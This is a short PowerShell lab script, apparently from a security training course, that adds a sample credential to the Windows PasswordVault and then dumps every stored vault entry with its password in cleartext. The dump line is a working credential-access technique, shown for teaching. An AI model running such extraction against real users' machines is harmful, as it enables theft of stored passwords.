<#
 .SYNOPSIS
  Extract credentials from Windows PasswordVault.

 .DESCRIPTION
  This script extracts secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials (e.g., for Internet Explorer, Edge and other applications).

 .EXAMPLE
  # this example shows how to execute the script.
  PS C:\> ./Lab3.4-2-Find-InterestingFilesPasswordVault.ps1

 .INPUTS
  None.

 .OUTPUTS
  None.

#>

# Load the Credentials and PasswordVault assemblies
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]

# instantiate a PasswordVault
$vault = New-Object Windows.Security.Credentials.PasswordVault

# Read contents of PasswordVault - initially it will be empty
$vault.RetrieveAll()

# Add a credential to the PasswordVault
$cred = New-Object Windows.Security.Credentials.PasswordCredential
$cred.Resource = 'William Dampier'
$cred.UserName = 'OLDOCBROWN\dampiw05'
$cred.Password = 'Super_Secret_Password5'
$vault.add($cred)
Remove-Variable cred  # So that we don't have the password lingering in memory

# Extract credentials from vault including passwords in cleartext
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
 
# Remove a credential from the PasswordVault
$cred = New-Object Windows.Security.Credentials.PasswordCredential
$cred.Resource = 'William Dampier'
$cred.UserName = 'OLDOCBROWN\dampiw05'
$vault.Remove($cred)

# Read contents of PasswordVault - initially it will be empty
$vault.RetrieveAll()
